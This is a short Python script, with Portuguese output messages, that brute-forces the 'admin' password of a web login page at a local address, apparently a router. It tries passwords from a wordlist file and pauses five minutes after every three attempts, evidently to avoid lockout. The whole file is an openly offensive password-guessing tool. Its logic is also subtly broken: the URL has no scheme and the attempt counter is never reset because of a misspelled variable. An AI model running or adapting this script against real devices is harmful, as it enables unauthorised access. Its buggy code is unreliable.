import requests
from time import sleep

url = '192.168.15.1/login.html'
arquivo = open('lista.txt')
linhas = arquivo.readlines()

cont = 0

for linha in linhas:
    if cont < 3:

        dados = {'user' : 'admin',
                 'pass' : linha}

        resposta = requests.post(url, data=dados)

        if "senha errada" in resposta.text:
            print (f'Senha incorreta: {linha}')

        else:
            print (f'Senha correta: {linha}')

        cont += 1
    else:
        count = 0
        sleep(300)

